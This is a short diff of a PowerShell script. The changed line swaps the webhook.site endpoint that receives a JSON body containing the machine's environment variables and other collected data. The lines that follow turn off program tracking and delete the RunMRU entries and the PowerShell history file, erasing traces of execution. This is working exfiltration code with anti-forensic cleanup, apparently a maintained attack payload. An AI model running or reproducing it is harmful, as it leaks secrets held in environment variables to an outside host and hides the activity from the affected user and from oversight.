@@ -30,7 +30,7 @@ $Body = @{
     'extraInfo' = $extraInfo
     'env' = $envVars
 }
-Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
+Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/c1c1f214-b8b8-447d-8aed-2d2363a5f0b0 -Method Post -Body ($Body | ConvertTo-Json)
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
 Remove-Item (Get-PSReadlineOption).HistorySavePath
